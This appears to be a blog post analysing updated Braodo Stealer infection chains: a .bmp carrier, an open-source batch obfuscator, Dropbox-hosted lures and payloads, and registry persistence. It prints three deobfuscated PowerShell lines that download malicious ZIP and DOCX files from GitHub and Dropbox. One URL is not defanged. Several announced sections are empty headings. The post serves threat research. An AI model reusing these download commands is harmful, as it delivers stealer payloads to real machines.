---
title:  "Fresh Infections Of Braodo Stealer With Updated Techniques"
layout: post
categories: malware-analysis
---

## Contents

- Background.
- Technical Analysis.
    - Abusing .bmp file format.
    - Encoding and Obfuscation.
    - Abusing Dropbox services.
	- Abusing WHL packages. 
- IOCs.
- Conclusion.

## Background


Hi readers, hope you enjoyed my last blog on Braodo Stealer, as a newbie and as I'm just getting started I have decided to track the same, so recently I found that Braodo Stealer is back with a bunch of changes on their arsenal , which includes adding Base64 encoding along with renaming variable names and then abusing an open source obfuscator known as Abobas-Obfuscator. Well, the last but not the least that's using different file formats like .bmp and abusing Dropbox services for payload delivery.

## Technical Analysis.

In this phase, we will know different methods that this stealer uses to download the payload from various sources and executes the malicious python file. 


### Abusing .bmp file format.

One of the recent developments of Braodo Stealer's arsenal has been abusing bmp format for initial infections.

![image](https://github.com/user-attachments/assets/eb044983-e72d-46d3-a6a1-2701f87ea7f7)


So, we can see that there is encoded garbage blob present inside the bmp payload and the actual script which is responsible for downloading the final payload from Github which is exactly the same just like the previous campaigns with just different Github accounts downloading the final Python script.

### Encoding and obfuscation.

Another interesting development among the stealer arsenal is it has been using an open source obfuscator,known as [Abobus obfuscator](https://github.com/EscaLag/Abobus-obfuscator/blob/main/AbobusObf.py) as we found the name of the obfuscator as it is present in one of the sample with the name of the author.

![image](https://github.com/user-attachments/assets/0d2dae90-19d0-4d1d-b143-6ae11d6843ee)

The way this obfuscator works is by adding garbage values to the batch script then performing character encoding and by changing the cases of the alphabets in a random manner and many such pseduo obfuscation techniques . The way the sample deobfuscates and runs in memory is by initially changing the code page by using `chcp` windows utility and chnaging the code page to English which further faciliates the execution of the malicious batch script which then downloads the ZIP payload. As this is an open source obfuscator it was quite easy to understand and perform the deobfuscation.

The extracted config is as follows:

```
[net.servicepointmanager]::securityprotocol = [net.securityprotocoltype]::tls12
(new-object -typename system.net.webclient).downloadfile("hxxps://github.com/LoneNone1807/abcxyz/raw/main/abcxyz.zip", "C:\\Users\\Public\\25350.zip")

```
 
### Abusing Dropbox services.

As we know that the primary technique of Braodo stealer is to store the final payload over Github, but recently in one of the campaigns which was obfuscated with Abobus obfuscator was dropping a document as a lure . The document was mainly focused on online marketing of shoes and similar marketing gimmicks were present. 


![image](https://github.com/user-attachments/assets/7a8ed849-736e-4b87-92aa-3f92b0f4ca36)

So , once the lure was popped up on the screen, I de-obfuscated and found out that this campaign is using Dropbox services to download the payload and also adding a registry key as persistance. The extracted configs are as follows:

```
[net.servicepointmanager]::securityprotocol = [net.securityprotocoltype]::tls12
(new-object -typename system.net.webclient).downloadfile("hxxps://www.dropbox.com/scl/fi/mkx2tii0ud0i6ugpbbjh6/Product_Marketing_and_Brand_Marketing_Campaigns0909.docx?rlkey=4gqc2cpjo6kp5iltdjevlbxzv&st=50y5pfp4&dl=1", "C:\\Users\\Admin\\AppData\\Local\\Temp\\\\Product_Marketing_and_Brand_Marketing_Campaigns0909.docx")
```

```
[net.servicepointmanager]::securityprotocol = [net.securityprotocoltype]::tls12
(new-object -typename system.net.webclient).downloadfile("https://www.dropbox.com/scl/fi/0qh04if44j5q056ehruij/tn0909.zip?rlkey=f9zmunjbhjdmsuh7by9bp4wf1&st=ffsvc7c8&dl=1", "C:\\Users\\Public\\Document.zip")
```

### Abusing whl package

## Conclusion.



